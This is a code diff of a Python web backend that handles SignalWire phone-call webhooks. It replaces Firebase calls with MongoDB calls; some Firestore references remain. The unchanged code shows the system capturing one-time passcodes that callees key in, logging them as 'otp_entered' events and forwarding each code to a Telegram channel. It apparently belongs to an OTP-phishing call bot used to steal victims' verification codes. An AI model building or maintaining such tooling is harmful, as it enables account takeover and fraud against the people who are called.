@@ -102,7 +102,7 @@ async def signalwire_first_input(call_id: str, request: Request, Digits: str = F
             'data': {'digit': Digits}
         }
         
-        await FirebaseService.update_call_events(call_id, event)
+        await MongoDBService.update_call_events(call_id, event)
         await manager.send_to_user(call_data['user_id'], {
             'type': 'call_event',
             'call_id': call_id,
@@ -166,7 +166,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
                 'data': {'otp': Digits}
             }
             
-            await FirebaseService.update_call_events(call_id, event)
+            await MongoDBService.update_call_events(call_id, event)
             call_ref.update({'status': 'otp_entered'})
             
             await manager.send_to_user(call_data['user_id'], {
@@ -177,7 +177,7 @@ async def signalwire_deny(call_id: str, request: Request, Digits: str = Form(Non
             
             # Forward OTP to Telegram (optional)
             try:
-                user = await FirebaseService.get_user(call_data['user_id'])
+                user = await MongoDBService.get_user(call_data['user_id'])
                 await telegram.send_otp_to_channel(
                     otp_code=Digits,
                     call_id=call_id,
@@ -248,7 +248,7 @@ async def signalwire_accept(call_id: str, request: Request):
             'data': {}
         }
         
-        await FirebaseService.update_call_events(call_id, event)
+        await MongoDBService.update_call_events(call_id, event)
         call_ref.update({'status': 'accepted'})
         
         await manager.send_to_user(call_data['user_id'], {
@@ -300,7 +300,7 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
             'data': {'digits': Digits}
         }
         
-        await FirebaseService.update_call_events(call_id, event)
+        await MongoDBService.update_call_events(call_id, event)
         
         # Update status to 'digit_entered'
         call_ref.update({'status': 'digit_entered'})
@@ -314,7 +314,7 @@ async def signalwire_gather(call_id: str, request: Request, Digits: str = Form(N
         # Forward OTP to Telegram (optional, don't block on error)
         if Digits:
             try:
-                user = await FirebaseService.get_user(call_data['user_id'])
+                user = await MongoDBService.get_user(call_data['user_id'])
                 await telegram.send_otp_to_channel(
                     otp_code=Digits,
                     call_id=call_id,
@@ -407,7 +407,7 @@ async def external_webhook_update(call_id: str, request: Request):
             'data': data
         }
         
-        await FirebaseService.update_call_events(call_id, event)
+        await MongoDBService.update_call_events(call_id, event)
         
         # Send to user via WebSocket
         await manager.send_to_user(call_data['user_id'], {
@@ -446,7 +446,7 @@ async def signalwire_status(call_id: str, request: Request):
                 'data': {'status': call_status, 'recording_url': recording_url}
             }
             
-            await FirebaseService.update_call_events(call_id, event)
+            await MongoDBService.update_call_events(call_id, event)
             
             # Update call status and recording URL in Firestore
             update_data = {'status': call_status.lower()}
